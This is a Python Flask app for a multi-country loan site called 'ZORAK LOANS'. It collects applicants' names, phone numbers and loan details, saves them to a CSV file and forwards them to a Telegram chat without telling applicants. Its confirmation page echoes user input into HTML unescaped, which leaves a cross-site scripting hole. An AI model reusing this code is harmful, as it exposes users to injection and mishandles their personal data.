from flask import Flask, request
import csv, os, requests
from datetime import datetime
app = Flask(__name__)
N = chr(10)
W = 'https://wa.me/message/CFCJWLOZ7IWZK1'
B = os.environ.get('BOT_TOKEN')
C = os.environ.get('CHAT_ID')
H = '<style>body{margin:0;background:#f2f7f2;font-family:Arial}.top{background:#0a5c36;color:#fff;padding:18px;text-align:center}.wrap{max-width:520px;margin:16px auto;padding:0 14px}.card{background:#fff;border-radius:16px;padding:20px}.btn{background:#0a5c36;color:#fff;padding:14px;border-radius:12px;display:block;text-align:center;text-decoration:none}.btn2{background:#ffc107;color:#111}.big{font-size:28px;color:#0a5c36}.muted{color:#666}</style><div class=top><b>ZORAK LOANS</b><div>Zambia | Zimbabwe | Tanzania | Ghana</div></div>'
def send(t):
    try:
        u = 'https://api.telegram.org/bot' + B + '/sendMessage'
        requests.post(u, json={'chat_id': C, 'text': t}, timeout=10)
    except:
        pass
@app.route('/')
@app.route('/api')
def home():
    return H + '<div class=wrap><div class=card><h1>Need cash today?</h1><p>Country</p><select id=c><option>Zambia</option><option>Zimbabwe</option><option>Tanzania</option><option>Ghana</option></select><p>Amount</p><input id=a value=5000><p>Term</p><input id=n value=12><p>Monthly Payment</p><div class=big id=m></div><button class=btn onclick=calc()>Calculate</button><br><a class="btn btn2" href=/apply-form>APPLY NOW</a><br><a class=btn href=' + W + '>WhatsApp</a></div></div><script>function calc(){var a=document.getElementById("a").value;var n=document.getElementById("n").value;var r=0.08/12;var m=a*r/(1-Math.pow(1+r,-n));document.getElementById("m").innerText=m.toFixed(2)}calc()</script>'
@app.route('/apply-form')
@app.route('/api/apply-form')
def form():
    return H + '<div class=wrap><div class=card><h1>Apply Now</h1><form method=POST action=/apply><p>Name</p><input name=name required><p>Phone</p><input name=phone required><p>Country</p><select name=country><option>Zambia</option><option>Zimbabwe</option><option>Tanzania</option><option>Ghana</option></select><p>Amount</p><input name=amount required value=5000><p>Term</p><input name=term value=12><p>Purpose</p><select name=purpose><option>Business</option><option>School Fees</option><option>Medical</option><option>Rent</option><option>Other</option></select><br><br><button class=btn>SUBMIT</button></form></div></div>'
@app.route('/apply', methods=['POST'])
@app.route('/api/apply', methods=['POST'])
def apply():
    n = request.form.get('name', '')
    p = request.form.get('phone', '')
    c = request.form.get('country', '')
    a = request.form.get('amount', '')
    t = request.form.get('term', '')
    u = request.form.get('purpose', '')
    with open('leads.csv', 'a', newline='') as f:
        csv.writer(f).writerow([datetime.now().isoformat(), n, p, c, a, t, u])
    cur = 'ZMW'
    if c == 'Zimbabwe':
        cur = 'USD'
    if c == 'Tanzania':
        cur = 'TSh'
    if c == 'Ghana':
        cur = 'GHS'
    send('New Lead' + N + 'Name: ' + n + N + 'Phone: ' + p + N + 'Country: ' + c + N + 'Amount: ' + a + ' ' + cur + N + 'Term: ' + t + N + 'Purpose: ' + u)
    return H + '<div class=wrap><div class=card><h1>Thank you, ' + n + '!</h1><p>Request for <b>' + a + ' ' + cur + '</b> received.</p><p>We call you on <b>' + p + '</b></p><a class=btn href=' + W + '>WhatsApp</a><br><a class="btn btn2" href=/>Apply Another</a></div></div>'
@app.route('/test-telegram')
def test():
    r = requests.post('https://api.telegram.org/bot' + B + '/sendMessage', json={'chat_id': C, 'text': 'Test OK'}, timeout=10)
    return 'Status: ' + str(r.status_code)
@app.route('/health')
def health():
    return 'OK'
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
